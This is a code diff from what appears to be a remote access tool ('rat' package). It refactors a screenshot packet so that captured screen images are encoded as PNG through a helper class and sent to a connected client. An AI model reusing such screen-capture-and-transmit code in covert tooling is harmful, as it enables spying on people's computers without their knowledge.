@@ -6,14 +6,10 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-
-import javax.imageio.ImageIO;
 
 import de.sogomn.engine.Screen;
 import de.sogomn.engine.Screen.ResizeBehavior;
+import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.ActiveClient;
 
 public final class ScreenshotPacket extends AbstractPingPongPacket {
@@ -43,15 +39,7 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveClient client) {
-		final ByteArrayOutputStream out = new ByteArrayOutputStream();
-		
-		try {
-			ImageIO.write(image, "PNG", out);
-		} catch (final IOException ex) {
-			ex.printStackTrace();
-		}
-		
-		final byte[] data = out.toByteArray();
+		final byte[] data = ImageUtils.toByteArray(image, "PNG");
 		
 		client.writeInt(data.length);
 		client.write(data);
@@ -69,14 +57,10 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 		
 		client.read(data);
 		
-		final ByteArrayInputStream in = new ByteArrayInputStream(data);
+		image = ImageUtils.toImage(data);
 		
-		try {
-			image = ImageIO.read(in);
-		} catch (final IOException ex) {
+		if (image == null) {
 			image = NO_IMAGE;
-			
-			ex.printStackTrace();
 		}
 	}
 	
